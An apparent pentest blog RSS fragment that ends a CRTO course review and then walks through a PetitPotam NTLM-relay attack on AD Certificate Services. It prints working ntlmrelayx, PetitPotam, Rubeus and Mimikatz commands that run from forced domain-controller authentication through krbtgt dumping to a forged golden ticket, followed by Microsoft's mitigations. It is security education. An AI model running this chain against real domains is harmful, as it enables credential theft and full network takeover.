    <img src="/images/exam.png"  alt="Exam Timeline"  class="center"  style="border-radius: 8px;"  />


<em>My exam timeline</em>

    <img src="/images/cert.png"  alt="Exam Timeline"  class="left"  style="border-radius: 8px;"  />


<em>Another one to the collection</em></p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>For me, RTO was the best course I&rsquo;ve ever taken so far, material was top notch, great lab experience, and I actually enjoyed doing the course. Can&rsquo;t wait for RTO2 :)
<br>
I will start OffShore ProLab on HackTheBox in a week or two, now I&rsquo;ve got the knowledge, let&rsquo;s put it into the test and gain some more skills! After that, OSEP is next on my list.</p>
<p>Should you take this course? <strong>Yes!!</strong>
<br>
Are you a pentester who wants to step up your AD and internal network testing game? <strong>Big Yes</strong>
<br>
Are you wanting to transit to Red Teaming? <strong>Ohhh Yesss!</strong>
<br>
Are you a Blue Team Operator/SOC Analyst who wants to use the knowledge from the Offensive side to reinforce your Defending/Detection game? <strong>Heck Yes!</strong>
<br>
Are you not in Tech at all and having no clue how you got here? <strong>Um, maybe not CRTO yet, but if you think this sounds cool, start hacking :&quot;)</strong></p>
]]></content></item><item><title>Pwning Domain Admin with PetitPotam</title><link>https://jakemai0.github.io/posts/petitpotam/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/petitpotam/</guid><description>Disclaimer: Original research was done by Will Schroeder and Lee Christensen in their Certified Pre-Owned whitepaper.
PetitPotam PoC was written by Lionel Gilles.
Introduction In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&amp;rsquo;t gotten a chance to play around with ADCS before, but I did remember reading about one attack technique called PetitPotam that abuses NTLM Relay via ADCS to take over the domain.</description><content type="html"><![CDATA[<p><strong>Disclaimer:</strong>
Original research was done by <a href="https://twitter.com/harmj0y">Will Schroeder</a> and <a href="https://twitter.com/tifkin_">Lee Christensen</a> in their <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a> whitepaper.</p>
<p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a> PoC was written by <a href="https://twitter.com/topotam77">Lionel Gilles</a>.</p>
<h2 id="introduction">Introduction</h2>
<p>In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&rsquo;t gotten a chance to play around with ADCS before, but I did remember reading about one attack technique called <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> that abuses NTLM Relay via ADCS to take over the domain. After some time reading up about the technique and getting my hands dirty, I have successfully compromised DA! This blog post will be a quick rundown of how I got DA using this attack.</p>
<h3 id="active-directory-certificate-services">Active Directory Certificate Services</h3>
<p>At a high level, ADCS is a server role in Windows Active Directory that allows users to build a Public Key Infrastructure (PKI). This means that it can provide digital certificates and digital signature capabilities, improving confidentiality via encryption and integrity via digital signatures. The practical applications of ADCS are SSL/TLS, VPN (Virtual Private Network), IPSec (Internet Protocol Security), EFS (Encrypting File System), Smart Card logon, and more.</p>
<h3 id="petitpotam">PetitPotam</h3>
<p>PetitPotam is an attack technique that abuses NTLM Relay via ADCS CA with Web Enrollment enabled by exploiting the MS-EFSRPC (Encrypting File System Remote Protocol). This technique allows an <strong>unauthenticated</strong> attacker in the internal network to force the Domain Controller (DC) machine account to authenticate towards a machine with NTLM relay configured (the attacker machine). This authentication will then be relayed to the CA Web Enrollment to request for a certificate as the DC. This certificate can be captured and be used to request for a TGT as the DC machine account. With this TGT, Mimikatz can be used to dump credentials of the DA or the krbtgt account to fully compromise the Active Directory environment.</p>
<h2 id="action">Action</h2>
<p>From the foothold domain machine, I did some enumeration and was able to locate a CA in the domain. A native Windows tool called <code>certutil.exe</code> or <a href="https://github.com/GhostPack/Certify">Certify</a> can be used for this purpose. Certify is a C# tool to enumerate and abuse misconfigurations in ADCS, this tool can also be used to look for vulnerable certificate templates. Misconfiguration in certificate templates can lead to privilege escaltion, unfortunately, no vulnerable template was identified.

    <img src="/images/CA_.png"  alt="CA"  class="left"  style="border-radius: 8px;"  />


<em>Identified CA</em></p>
<p>With this, I was able to launch the ADCS Relay attack. The idea is to corece the DC to connect to the attacker machine, then relay the credential of the DC machine account to the ADCS server and request for a certificate (on behalf on the DC$). With this certificate, we can request for a TGT as the DC, and proceed to pwn the whole environment.</p>
<p>From the attacker box, launch <code>ntlmrelayx.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
</span></span></code></pre></div><p>The <code>--template</code> argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be <code>domaincontroller</code>, you could enumerate the template on the ADCS using Certify: <code>Certify.exe cas</code></p>
<p>On another window on the attacker box, launch <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> against the DC:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 petitpotam.py &lt;Attack box<span style="color:#e6db74">&#39;s IP&gt; &lt;DC&#39;</span>s IP&gt;
</span></span></code></pre></div><p>The attack was successful, on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:

    <img src="/images/b64cert.png"  alt="certfnsh.asp"  class="left"  style="border-radius: 8px;"  />


<em>Base64 certificate of DC$</em></p>
<p>From here, I proceeded with requesting for a TGT of DC$ using <code>Rubeus</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>DC$ /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /certificate<span style="color:#960050;background-color:#1e0010">:</span>&lt;base64-certificate&gt; /ptt
</span></span></code></pre></div><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
<br>
From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
Launch Mimikatz and dump the AES256 encryption key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From mimikatz:</span>
</span></span><span style="display:flex;"><span>lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span></code></pre></div><p>Once the AES256 encryption key of the krbtgt account has been captured, the Golden Ticket could be forged:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From Mimikatz:</span>
</span></span><span style="display:flex;"><span>kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /sid<span style="color:#960050;background-color:#1e0010">:</span>&lt;SID of the domain&gt; /aes256<span style="color:#960050;background-color:#1e0010">:</span>&lt;aes256 key&gt; /ticket<span style="color:#960050;background-color:#1e0010">:</span>goldie.kirbi
</span></span></code></pre></div><p>Proceed to inject the Golden Ticket:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>goldie.kirbi
</span></span></code></pre></div><p>GG!</p>
<h2 id="mitigation">Mitigation</h2>
<p>The misconfiguration has been mitigated immediately by enabling Extended Protection for Authentication (EPA) for CA Web Enrollment and Certificate Enrollment Web Service.</p>
<p>Addition mitigations that are recommended by Microsoft are:</p>
<ul>
<li>Disable NTLM Authentication on Windows Domain Controllers.</li>
<li>Disable NTLM on any ADCS server using Group Policy.</li>
<li>Disable NTLM for Internet Information Services (IIS) on AD CS Servers in the domain running the &ldquo;Certificate Authority Web Enrollment&rdquo; or &ldquo;Certificate Enrollment Web Service&rdquo; services.
\</li>
</ul>
<p>More information can be found <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;epi=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;irgwc=1&amp;OCID=AID2200057_aff_7806_1243925&amp;tduid=%28ir__pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00%29%287806%29%281243925%29%28a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA%29%28%29&amp;irclickid=_pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00">here</a></p>
]]></content></item></channel></rss>